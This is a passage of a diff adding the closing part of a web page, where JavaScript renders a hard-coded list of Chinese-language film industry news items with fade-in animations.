+    { day: '06', month: '10月', title: '华语电影新生代导演崛起，多元题材引关注', excerpt: '一批80后、90后导演带着新颖的叙事视角和拍摄手法进入大众视野，为华语电影注入新活力...', tag: '新片速递', emoji: '🎬' },
+    { day: '05', month: '10月', title: '东南亚电影产业快速发展，多元文化成亮点', excerpt: '泰国、越南、印尼等国的电影产业正快速崛起，独特的地域文化和故事吸引全球观众...', tag: '产业动态', emoji: '🌏' }
+];
+
+var newsList = document.getElementById('newsList');
+news.forEach(function(item, index) {
+    var newsItem = document.createElement('a');
+    newsItem.href = '#';
+    newsItem.className = 'news-item fade-in';
+    newsItem.innerHTML =
+        '<div class="news-date">' +
+            '<div class="news-date-day">' + item.day + '</div>' +
+            '<div class="news-date-month">' + item.month + '</div>' +
+        '</div>' +
+        '<div style="font-size:1.5rem;">' + item.emoji + '</div>' +
+        '<div class="news-content">' +
+            '<div class="news-title">' + item.title + '</div>' +
+            '<div class="news-excerpt">' + item.excerpt + '</div>' +
+            '<span class="news-tag">' + item.tag + '</span>' +
+        '</div>';
+    newsList.appendChild(newsItem);
+});
+
+// ========== Observe dynamically added elements ==========
+setTimeout(function() {
+    document.querySelectorAll('.fade-in').forEach(function(el) {
+        observer.observe(el);
+    });
+}, 100);
+</script>
+</body>
+</html>
